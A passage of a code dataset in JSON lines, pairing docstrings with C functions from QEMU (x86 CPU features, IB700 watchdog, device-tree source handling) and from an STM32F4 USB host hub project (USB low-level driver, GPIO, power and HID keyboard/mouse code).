\"model-id\", errp);\n\n    /* Special cases not set in the X86CPUDefinition structs: */\n    if (kvm_enabled()) {\n        FeatureWord w;\n        for (w = 0; w < FEATURE_WORDS; w++) {\n            env->features[w] |= kvm_default_features[w];\n        }\n    }\n\n    env->features[FEAT_1_ECX] |= CPUID_EXT_HYPERVISOR;\n\n    /* sysenter isn't supported in compatibility mode on AMD,\n     * syscall isn't supported in compatibility mode on Intel.\n     * Normally we advertise the actual CPU vendor, but you can\n     * override this using the 'vendor' property if you want to use\n     * KVM's sysenter/syscall emulation in compatibility mode and\n     * when doing cross vendor migration\n     */\n    vendor = def->vendor;\n    if (kvm_enabled()) {\n        uint32_t  ebx = 0, ecx = 0, edx = 0;\n        host_cpuid(0, 0, NULL, &ebx, &ecx, &edx);\n        x86_cpu_vendor_words2str(host_vendor, ebx, edx, ecx);\n        vendor = host_vendor;\n    }\n\n    object_property_set_str(OBJECT(cpu), vendor, \"vendor\", errp);\n\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/**\n * x86_cpu_compat_set_features:\n * @cpu_model: CPU model name to be changed. If NULL, all CPU models are changed\n * @w: Identifies the feature word to be changed.\n * @feat_add: Feature bits to be added to feature word\n * @feat_remove: Feature bits to be removed from feature word\n *\n * Change CPU model feature bits for compatibility.\n *\n * This function may be used by machine-type compatibility functions\n * to enable or disable feature bits on specific CPU models.\n */\n", "func_signal": "void x86_cpu_compat_set_features(const char *cpu_model, FeatureWord w,\n                                 uint32_t feat_add, uint32_t feat_remove)", "code": "{\n    X86CPUDefinition *def;\n    int i;\n    for (i = 0; i < ARRAY_SIZE(builtin_x86_defs); i++) {\n        def = &builtin_x86_defs[i];\n        if (!cpu_model || !strcmp(cpu_model, def->name)) {\n            def->features[w] |= feat_add;\n            def->features[w] &= ~feat_remove;\n        }\n    }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* Calculates initial APIC ID for a specific CPU index\n *\n * Currently we need to be able to calculate the APIC ID from the CPU index\n * alone (without requiring a CPU object), as the QEMU<->Seabios interfaces have\n * no concept of \"CPU index\", and the NUMA tables on fw_cfg need the APIC ID of\n * all CPUs up to max_cpus.\n */\n", "func_signal": "uint32_t x86_cpu_apic_id_from_index(unsigned int cpu_index)", "code": "{\n    uint32_t correct_id;\n    static bool warned;\n\n    correct_id = x86_apicid_from_cpu_idx(smp_cores, smp_threads, cpu_index);\n    if (compat_apic_id_mode) {\n        if (cpu_index != correct_id && !warned) {\n            error_report(\"APIC IDs set in compatibility mode, \"\n                         \"CPU topology won't match the configuration\");\n            warned = true;\n        }\n        return cpu_index;\n    } else {\n        return correct_id;\n    }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* This is called when the watchdog expires. */\n", "func_signal": "static void ib700_timer_expired(void *vp)", "code": "{\n    IB700State *s = vp;\n\n    ib700_debug(\"watchdog expired\\n\");\n\n    watchdog_perform_action();\n    timer_del(s->timer);\n}", "path": "qemu\\hw\\watchdog\\wdt_ib700.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* Check if all requested cpu flags are making their way to the guest\n *\n * Returns 0 if all flags are supported by the host, non-zero otherwise.\n *\n * This function may be called only if KVM is enabled.\n */\n", "func_signal": "static int kvm_check_features_against_host(KVMState *s, X86CPU *cpu)", "code": "{\n    CPUX86State *env = &cpu->env;\n    int rv = 0;\n    FeatureWord w;\n\n    assert(kvm_enabled());\n\n    for (w = 0; w < FEATURE_WORDS; w++) {\n        FeatureWordInfo *wi = &feature_word_info[w];\n        uint32_t guest_feat = env->features[w];\n        uint32_t host_feat = kvm_arch_get_supported_cpuid(s, wi->cpuid_eax,\n                                                             wi->cpuid_ecx,\n                                                             wi->cpuid_reg);\n        uint32_t mask;\n        for (mask = 1; mask; mask <<= 1) {\n            if (guest_feat & mask && !(host_feat & mask)) {\n                unavailable_host_feature(wi, mask);\n                rv = 1;\n            }\n        }\n    }\n    return rv;\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* = 0 */\n", "func_signal": "FILE *srcfile_relative_open(const char *fname, char **fullnamep)", "code": "{\n\tFILE *f;\n\tchar *fullname;\n\n\tif (streq(fname, \"-\")) {\n\t\tf = stdin;\n\t\tfullname = xstrdup(\"<stdin>\");\n\t} else {\n\t\tif (!current_srcfile || !current_srcfile->dir\n\t\t    || (fname[0] == '/'))\n\t\t\tfullname = xstrdup(fname);\n\t\telse\n\t\t\tfullname = join_path(current_srcfile->dir, fname);\n\n\t\tf = fopen(fullname, \"r\");\n\t\tif (!f)\n\t\t\tdie(\"Couldn't open \\\"%s\\\": %s\\n\", fname,\n\t\t\t    strerror(errno));\n\t}\n\n\tif (fullnamep)\n\t\t*fullnamep = fullname;\n\telse\n\t\tfree(fullname);\n\n\treturn f;\n}", "path": "qemu\\dtc\\srcpos.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* A write (of any value) to this register disables the timer. */\n", "func_signal": "static void ib700_write_disable_reg(void *vp, uint32_t addr, uint32_t data)", "code": "{\n    IB700State *s = vp;\n\n    ib700_debug(\"addr = %x, data = %x\\n\", addr, data);\n\n    timer_del(s->timer);\n}", "path": "qemu\\hw\\watchdog\\wdt_ib700.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* TODO: remove me, when reset over QOM tree is implemented */\n", "func_signal": "static void x86_cpu_machine_reset_cb(void *opaque)", "code": "{\n    X86CPU *cpu = opaque;\n    cpu_reset(CPU(cpu));\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* Generic getter for \"feature-words\" and \"filtered-features\" properties */\n", "func_signal": "static void x86_cpu_get_feature_words(Object *obj, Visitor *v, void *opaque,\n                                      const char *name, Error **errp)", "code": "{\n    uint32_t *array = (uint32_t *)opaque;\n    FeatureWord w;\n    Error *err = NULL;\n    X86CPUFeatureWordInfo word_infos[FEATURE_WORDS] = { };\n    X86CPUFeatureWordInfoList list_entries[FEATURE_WORDS] = { };\n    X86CPUFeatureWordInfoList *list = NULL;\n\n    for (w = 0; w < FEATURE_WORDS; w++) {\n        FeatureWordInfo *wi = &feature_word_info[w];\n        X86CPUFeatureWordInfo *qwi = &word_infos[w];\n        qwi->cpuid_input_eax = wi->cpuid_eax;\n        qwi->has_cpuid_input_ecx = wi->cpuid_needs_ecx;\n        qwi->cpuid_input_ecx = wi->cpuid_ecx;\n        qwi->cpuid_register = x86_reg_info_32[wi->cpuid_reg].qapi_enum;\n        qwi->features = array[w];\n\n        /* List will be in reverse order, but order shouldn't matter */\n        list_entries[w].next = list;\n        list_entries[w].value = &word_infos[w];\n        list = &list_entries[w];\n    }\n\n    visit_type_X86CPUFeatureWordInfoList(v, &list, \"feature-words\", &err);\n    error_propagate(errp, err);\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* A write to this register enables the timer. */\n", "func_signal": "static void ib700_write_enable_reg(void *vp, uint32_t addr, uint32_t data)", "code": "{\n    IB700State *s = vp;\n    static int time_map[] = {\n        30, 28, 26, 24, 22, 20, 18, 16,\n        14, 12, 10,  8,  6,  4,  2,  0\n    };\n    int64_t timeout;\n\n    ib700_debug(\"addr = %x, data = %x\\n\", addr, data);\n\n    timeout = (int64_t) time_map[data & 0xF] * get_ticks_per_sec();\n    timer_mod(s->timer, qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) + timeout);\n}", "path": "qemu\\hw\\watchdog\\wdt_ib700.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* search featureset for flag *[s..e), if found set corresponding bit in\n * *pval and return true, otherwise return false\n */\n", "func_signal": "static bool lookup_feature(uint32_t *pval, const char *s, const char *e,\n                           const char **featureset)", "code": "{\n    uint32_t mask;\n    const char **ppc;\n    bool found = false;\n\n    for (mask = 1, ppc = featureset; mask; mask <<= 1, ++ppc) {\n        if (*ppc && !altcmp(s, e, *ppc)) {\n            *pval |= mask;\n            found = true;\n        }\n    }\n    return found;\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/* Convert all '_' in a feature string option name to '-', to make feature\n * name conform to QOM property naming rule, which uses '-' instead of '_'.\n */\n", "func_signal": "static inline void feat2prop(char *s)", "code": "{\n    while ((s = strchr(s, '_'))) {\n        *s = '-';\n    }\n}", "path": "qemu\\target-i386\\cpu.c", "repo_name": "levex/kernel-qemu-pci", "stars": 81, "license": "gpl-2.0", "language": "c", "size": 10532}
{"docstring": "/**\n  * @brief  USBH_HID_KeybdInit \n  *         The function init the HID keyboard.\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "USBH_StatusTypeDef USBH_HID_KeybdInit(USBH_HandleTypeDef *phost)", "code": "{\n  uint32_t x;\n  uint8_t idx = phost->device.current_interface;\n  HID_HandleTypeDef *HID_Handle = phost->USBH_ClassTypeDef_pData[idx];\n\n    \n  keybd_info.lctrl=keybd_info.lshift= 0;\n  keybd_info.lalt=keybd_info.lgui= 0;\n  keybd_info.rctrl=keybd_info.rshift= 0;\n  keybd_info.ralt=keybd_info.rgui=0;\n  \n  \n  for(x=0; x< (sizeof(keybd_report_data)/sizeof(uint32_t)); x++)\n  {\n    keybd_report_data[x]=0;\n  }\n  \n  if(HID_Handle->length[0] > (sizeof(keybd_report_data)/sizeof(uint32_t)))\n  {\n    HID_Handle->length[0] = (sizeof(keybd_report_data)/sizeof(uint32_t));\n  }\n  HID_Handle->pData = (uint8_t*)keybd_report_data;\n  fifo_init(&HID_Handle->fifo, phost->device.Data, HID_QUEUE_SIZE * sizeof(keybd_report_data));\n\n  return USBH_OK;    \n}", "path": "Project\\Middlewares\\ST\\STM32_USB_Host_Library\\Class\\HID\\Src\\usbh_hid_keybd.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USB_ReadDevAllOutEpInterrupt: return the USB device OUT endpoints interrupt status\n  * @param  USBx : Selected device\n  * @retval HAL status\n  */\n", "func_signal": "uint32_t USB_ReadDevAllOutEpInterrupt (USB_OTG_GlobalTypeDef *USBx)", "code": "{\n  uint32_t v;\n  v  = USBx_DEVICE->DAINT;\n  v &= USBx_DEVICE->DAINTMSK;\n  return ((v & 0xffff0000) >> 16);\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Returns Device OUT EP Interrupt register\n  * @param  USBx : Selected device\n  * @param  epnum : endpoint number\n  *          This parameter can be a value from 0 to 15\n  * @retval Device OUT EP Interrupt register\n  */\n", "func_signal": "uint32_t USB_ReadDevOutEPInterrupt (USB_OTG_GlobalTypeDef *USBx , uint8_t epnum)", "code": "{\n  uint32_t v;\n  v  = USBx_OUTEP(epnum)->DOEPINT;\n  v &= USBx_DEVICE->DOEPMSK;\n  return v;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Reset the USB Core (needed after USB clock settings change)\n  * @param  USBx : Selected device\n  * @retval HAL status\n  */\n", "func_signal": "static HAL_StatusTypeDef USB_CoreReset(USB_OTG_GlobalTypeDef *USBx)", "code": "{\n  uint32_t count = 0;\n\n  /* Wait for AHB master IDLE state. */\n  do\n  {\n    if (++count > 200000)\n    {\n      return HAL_TIMEOUT;\n    }\n  }\n  while ((USBx->GRSTCTL & USB_OTG_GRSTCTL_AHBIDL) == 0);\n  \n  /* Core Soft Reset */\n  count = 0;\n  USBx->GRSTCTL |= USB_OTG_GRSTCTL_CSRST;\n\n  do\n  {\n    if (++count > 200000)\n    {\n      return HAL_TIMEOUT;\n    }\n  }\n  while ((USBx->GRSTCTL & USB_OTG_GRSTCTL_CSRST) == USB_OTG_GRSTCTL_CSRST);\n  \n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USB_DisableGlobalInt\n  *         Disable the controller's Global Int in the AHB Config reg\n  * @param  USBx : Selected device\n  * @retval HAL status\n*/\n", "func_signal": "HAL_StatusTypeDef USB_DisableGlobalInt(USB_OTG_GlobalTypeDef *USBx)", "code": "{\n  USBx->GAHBCFG &= ~USB_OTG_GAHBCFG_GINT;\n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USB_GetDevSpeed :Return the  Dev Speed \n  * @param  USBx : Selected device\n  * @retval speed : device speed\n  *          This parameter can be one of these values:\n  *            @arg USB_OTG_SPEED_HIGH: High speed mode\n  *            @arg USB_OTG_SPEED_FULL: Full speed mode\n  *            @arg USB_OTG_SPEED_LOW: Low speed mode\n  */\n", "func_signal": "uint8_t USB_GetDevSpeed(USB_OTG_GlobalTypeDef *USBx)", "code": "{\n  uint8_t speed = 0;\n  \n  if((USBx_DEVICE->DSTS & USB_OTG_DSTS_ENUMSPD) == DSTS_ENUMSPD_HS_PHY_30MHZ_OR_60MHZ)\n  {\n    speed = USB_OTG_SPEED_HIGH;\n  }\n  else if (((USBx_DEVICE->DSTS & USB_OTG_DSTS_ENUMSPD) == DSTS_ENUMSPD_FS_PHY_30MHZ_OR_60MHZ)||\n           ((USBx_DEVICE->DSTS & USB_OTG_DSTS_ENUMSPD) == DSTS_ENUMSPD_FS_PHY_48MHZ))\n  {\n    speed = USB_OTG_SPEED_FULL;\n  }\n  else if((USBx_DEVICE->DSTS & USB_OTG_DSTS_ENUMSPD) == DSTS_ENUMSPD_LS_PHY_6MHZ)\n  {\n    speed = USB_OTG_SPEED_LOW;\n  }\n  \n  return speed;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USBH_HID_GetMouseInfo \n  *         The function return mouse information.\n  * @param  phost: Host handle\n  * @retval mouse information\n  */\n", "func_signal": "HID_MOUSE_Info_TypeDef *USBH_HID_GetMouseInfo(USBH_HandleTypeDef *phost)", "code": "{\n\tif(USBH_HID_GetDeviceType(phost) == HID_MOUSE)\n\t{\n\t\tif(USBH_HID_MouseDecode(phost)== USBH_OK)\n\t\t\treturn &mouse_info;\n\t}\n\n\treturn NULL;\n}", "path": "Project\\Middlewares\\ST\\STM32_USB_Host_Library\\Class\\HID\\Src\\usbh_hid_mouse.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Prepare the EP0 to start the first control setup\n  * @param  USBx : Selected device\n  * @param  dma: USB dma enabled or disabled \n  *          This parameter can be one of these values:\n  *           0 : DMA feature not used \n  *           1 : DMA feature used  \n  * @param  psetup : pointer to setup packet\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef USB_EP0_OutStart(USB_OTG_GlobalTypeDef *USBx, uint8_t dma, uint8_t *psetup)", "code": "{\n  USBx_OUTEP(0)->DOEPTSIZ = 0;\n  USBx_OUTEP(0)->DOEPTSIZ |= (USB_OTG_DOEPTSIZ_PKTCNT & (1 << 19)) ;\n  USBx_OUTEP(0)->DOEPTSIZ |= (3 * 8);\n  USBx_OUTEP(0)->DOEPTSIZ |=  USB_OTG_DOEPTSIZ_STUPCNT;  \n  \n  if (dma == 1)\n  {\n    USBx_OUTEP(0)->DOEPDMA = (uint32_t)psetup;\n    /* EP enable */\n    USBx_OUTEP(0)->DOEPCTL = 0x80008000;\n  }\n  \n  return HAL_OK;  \n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USB_EnableGlobalInt\n  *         Enables the controller's Global Int in the AHB Config reg\n  * @param  USBx : Selected device\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef USB_EnableGlobalInt(USB_OTG_GlobalTypeDef *USBx)", "code": "{\n  USBx->GAHBCFG |= USB_OTG_GAHBCFG_GINT;\n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USBH_HID_GetASCIICode \n  *         The function decode keyboard data into ASCII characters.\n  * @param  phost: Host handle\n  * @param  info: Keyboard information\n  * @retval ASCII code\n  */\n", "func_signal": "uint8_t USBH_HID_GetASCIICode(HID_KEYBD_Info_TypeDef *info)", "code": "{\n  uint8_t output = 0;\n  if((info->lshift == 1) || (info->rshift))\n  {\n  output =  HID_KEYBRD_ShiftKey[HID_KEYBRD_Codes[info->keys[0]]];\n  }\n  else\n  {\n  output =  HID_KEYBRD_Key[HID_KEYBRD_Codes[info->keys[0]]];\n  }\n  return output;  \n}", "path": "Project\\Middlewares\\ST\\STM32_USB_Host_Library\\Class\\HID\\Src\\usbh_hid_keybd.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Toggles the specified GPIO pins.\n  * @param  GPIOx: Where x can be (A..K) to select the GPIO peripheral for STM32F429X device or\n  *                      x can be (A..I) to select the GPIO peripheral for STM32F40XX and STM32F427X devices.\n  * @param  GPIO_Pin: Specifies the pins to be toggled.\n  * @retval None\n  */\n", "func_signal": "void HAL_GPIO_TogglePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_GPIO_PIN(GPIO_Pin));\n\n  GPIOx->ODR ^= GPIO_Pin;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_hal_gpio.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n* @brief  USB_OTG_ResetPort : Reset Host Port\n  * @param  USBx : Selected device\n  * @retval HAL status\n  * @note   (1)The application must wait at least 10 ms\n  *   before clearing the reset bit.\n  */\n", "func_signal": "HAL_StatusTypeDef USB_ResetPort(USB_OTG_GlobalTypeDef *USBx)", "code": "{\n  __IO uint32_t hprt0;\n  \n  hprt0 = USBx_HPRT0;\n  \n  hprt0 &= ~(USB_OTG_HPRT_PENA    | USB_OTG_HPRT_PCDET |\\\n    USB_OTG_HPRT_PENCHNG | USB_OTG_HPRT_POCCHNG );\n  \n  USBx_HPRT0 = (USB_OTG_HPRT_PRST | hprt0);  \n  HAL_Delay (10);                                /* See Note #1 */\n  USBx_HPRT0 = ((~USB_OTG_HPRT_PRST) & hprt0); \n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Halt a host channel\n  * @param  USBx : Selected device\n  * @param  hc_num : Host Channel number\n  *         This parameter can be a value from 1 to 15\n  * @retval HAL state\n  */\n", "func_signal": "HAL_StatusTypeDef USB_HC_Halt(USB_OTG_GlobalTypeDef *USBx , uint8_t hc_num)", "code": "{\n  uint32_t count = 0;\n  \n  /* Check for space in the request queue to issue the halt. */\n  if (((USBx_HC(hc_num)->HCCHAR) & (HCCHAR_CTRL << 18)) || ((USBx_HC(hc_num)->HCCHAR) & (HCCHAR_BULK << 18)))\n  {\n    USBx_HC(hc_num)->HCCHAR |= USB_OTG_HCCHAR_CHDIS;\n    \n    if ((USBx->HNPTXSTS & 0xFFFF) == 0)\n    {\n      USBx_HC(hc_num)->HCCHAR &= ~USB_OTG_HCCHAR_CHENA;\n      USBx_HC(hc_num)->HCCHAR |= USB_OTG_HCCHAR_CHENA;  \n      USBx_HC(hc_num)->HCCHAR &= ~USB_OTG_HCCHAR_EPDIR;\n      do \n      {\n        if (++count > 1000) \n        {\n          break;\n        }\n      } \n      while ((USBx_HC(hc_num)->HCCHAR & USB_OTG_HCCHAR_CHENA) == USB_OTG_HCCHAR_CHENA);     \n    }\n    else\n    {\n      USBx_HC(hc_num)->HCCHAR |= USB_OTG_HCCHAR_CHENA; \n    }\n  }\n  else\n  {\n    USBx_HC(hc_num)->HCCHAR |= USB_OTG_HCCHAR_CHDIS;\n    \n    if ((USBx_HOST->HPTXSTS & 0xFFFF) == 0)\n    {\n      USBx_HC(hc_num)->HCCHAR &= ~USB_OTG_HCCHAR_CHENA;\n      USBx_HC(hc_num)->HCCHAR |= USB_OTG_HCCHAR_CHENA;  \n      USBx_HC(hc_num)->HCCHAR &= ~USB_OTG_HCCHAR_EPDIR;\n      do \n      {\n        if (++count > 1000) \n        {\n          break;\n        }\n      } \n      while ((USBx_HC(hc_num)->HCCHAR & USB_OTG_HCCHAR_CHENA) == USB_OTG_HCCHAR_CHENA);     \n    }\n    else\n    {\n       USBx_HC(hc_num)->HCCHAR |= USB_OTG_HCCHAR_CHENA; \n    }\n  }\n  \n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Activate and configure an endpoint\n  * @param  USBx : Selected device\n  * @param  ep: pointer to endpoint structure\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef USB_ActivateEndpoint(USB_OTG_GlobalTypeDef *USBx, USB_OTG_EPTypeDef *ep)", "code": "{\n  if (ep->is_in == 1)\n  {\n   USBx_DEVICE->DAINTMSK |= USB_OTG_DAINTMSK_IEPM & ((1 << (ep->num)));\n   \n    if (((USBx_INEP(ep->num)->DIEPCTL) & USB_OTG_DIEPCTL_USBAEP) == 0)\n    {\n      USBx_INEP(ep->num)->DIEPCTL |= ((ep->maxpacket & USB_OTG_DIEPCTL_MPSIZ ) | (ep->type << 18 ) |\\\n        ((ep->num) << 22 ) | (USB_OTG_DIEPCTL_SD0PID_SEVNFRM) | (USB_OTG_DIEPCTL_USBAEP)); \n    } \n\n  }\n  else\n  {\n     USBx_DEVICE->DAINTMSK |= USB_OTG_DAINTMSK_OEPM & ((1 << (ep->num)) << 16);\n     \n    if (((USBx_OUTEP(ep->num)->DOEPCTL) & USB_OTG_DOEPCTL_USBAEP) == 0)\n    {\n      USBx_OUTEP(ep->num)->DOEPCTL |= ((ep->maxpacket & USB_OTG_DOEPCTL_MPSIZ ) | (ep->type << 18 ) |\\\n       (USB_OTG_DIEPCTL_SD0PID_SEVNFRM)| (USB_OTG_DOEPCTL_USBAEP));\n    } \n  }\n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  De-activate and de-initialize an endpoint\n  * @param  USBx : Selected device\n  * @param  ep: pointer to endpoint structure\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef USB_DeactivateEndpoint(USB_OTG_GlobalTypeDef *USBx, USB_OTG_EPTypeDef *ep)", "code": "{\n  /* Read DEPCTLn register */\n  if (ep->is_in == 1)\n  {\n   USBx_DEVICE->DEACHMSK &= ~(USB_OTG_DAINTMSK_IEPM & ((1 << (ep->num))));\n   USBx_DEVICE->DAINTMSK &= ~(USB_OTG_DAINTMSK_IEPM & ((1 << (ep->num))));   \n   USBx_INEP(ep->num)->DIEPCTL &= ~ USB_OTG_DIEPCTL_USBAEP;   \n  }\n  else\n  {\n     USBx_DEVICE->DEACHMSK &= ~(USB_OTG_DAINTMSK_OEPM & ((1 << (ep->num)) << 16));\n     USBx_DEVICE->DAINTMSK &= ~(USB_OTG_DAINTMSK_OEPM & ((1 << (ep->num)) << 16));     \n     USBx_OUTEP(ep->num)->DOEPCTL &= ~USB_OTG_DOEPCTL_USBAEP;      \n  }\n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Activates the Over-Drive mode.\n  * @note   This function can be used only for STM32F42xx/STM32F43xx/STM32F446xx/STM32F469xx/STM32F479xx devices.\n  *         This mode allows the CPU and the core logic to operate at a higher frequency\n  *         than the normal mode for a given voltage scaling (scale 1, scale 2 or scale 3).   \n  * @note   It is recommended to enter or exit Over-drive mode when the application is not running \n  *         critical tasks and when the system clock source is either HSI or HSE. \n  *         During the Over-drive switch activation, no peripheral clocks should be enabled.   \n  *         The peripheral clocks must be enabled once the Over-drive mode is activated.   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PWREx_EnableOverDrive(void)", "code": "{\n  uint32_t tickstart = 0;\n\n  __HAL_RCC_PWR_CLK_ENABLE();\n  \n  /* Enable the Over-drive to extend the clock frequency to 180 Mhz */\n  __HAL_PWR_OVERDRIVE_ENABLE();\n\n  /* Get tick */\n  tickstart = HAL_GetTick();\n\n  while(!__HAL_PWR_GET_FLAG(PWR_FLAG_ODRDY))\n  {\n    if((HAL_GetTick() - tickstart ) > PWR_OVERDRIVE_TIMEOUT_VALUE)\n    {\n      return HAL_TIMEOUT;\n    }\n  }\n  \n  /* Enable the Over-drive switch */\n  __HAL_PWR_OVERDRIVESWITCHING_ENABLE();\n\n  /* Get tick */\n  tickstart = HAL_GetTick();\n\n  while(!__HAL_PWR_GET_FLAG(PWR_FLAG_ODSWRDY))\n  {\n    if((HAL_GetTick() - tickstart ) > PWR_OVERDRIVE_TIMEOUT_VALUE)\n    {\n      return HAL_TIMEOUT;\n    }\n  } \n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_hal_pwr_ex.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  USB_OTG_FlushTxFifo : Flush a Tx FIFO\n  * @param  USBx : Selected device\n  * @param  num : FIFO number\n  *         This parameter can be a value from 1 to 15\n            15 means Flush all Tx FIFOs\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef USB_FlushTxFifo (USB_OTG_GlobalTypeDef *USBx, uint32_t num )", "code": "{\n  uint32_t count = 0;\n \n  USBx->GRSTCTL = ( USB_OTG_GRSTCTL_TXFFLSH |(uint32_t)( num << 6)); \n \n  do\n  {\n    if (++count > 200000)\n    {\n      return HAL_TIMEOUT;\n    }\n  }\n  while ((USBx->GRSTCTL & USB_OTG_GRSTCTL_TXFFLSH) == USB_OTG_GRSTCTL_TXFFLSH);\n  \n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief  Locks GPIO Pins configuration registers.\n  * @note   The locked registers are GPIOx_MODER, GPIOx_OTYPER, GPIOx_OSPEEDR,\n  *         GPIOx_PUPDR, GPIOx_AFRL and GPIOx_AFRH.\n  * @note   The configuration of the locked GPIO pins can no longer be modified\n  *         until the next reset.\n  * @param  GPIOx: where x can be (A..F) to select the GPIO peripheral for STM32F4 family\n  * @param  GPIO_Pin: specifies the port bit to be locked.\n  *         This parameter can be any combination of GPIO_PIN_x where x can be (0..15).\n  * @retval None\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_GPIO_LockPin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin)", "code": "{\n  __IO uint32_t tmp = GPIO_LCKR_LCKK;\n\n  /* Check the parameters */\n  assert_param(IS_GPIO_PIN(GPIO_Pin));\n\n  /* Apply lock key write sequence */\n  tmp |= GPIO_Pin;\n  /* Set LCKx bit(s): LCKK='1' + LCK[15-0] */\n  GPIOx->LCKR = tmp;\n  /* Reset LCKx bit(s): LCKK='0' + LCK[15-0] */\n  GPIOx->LCKR = GPIO_Pin;\n  /* Set LCKx bit(s): LCKK='1' + LCK[15-0] */\n  GPIOx->LCKR = tmp;\n  /* Read LCKK bit*/\n  tmp = GPIOx->LCKR;\n\n if((GPIOx->LCKR & GPIO_LCKR_LCKK) != RESET)\n  {\n    return HAL_OK;\n  }\n  else\n  {\n    return HAL_ERROR;\n  }\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_hal_gpio.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
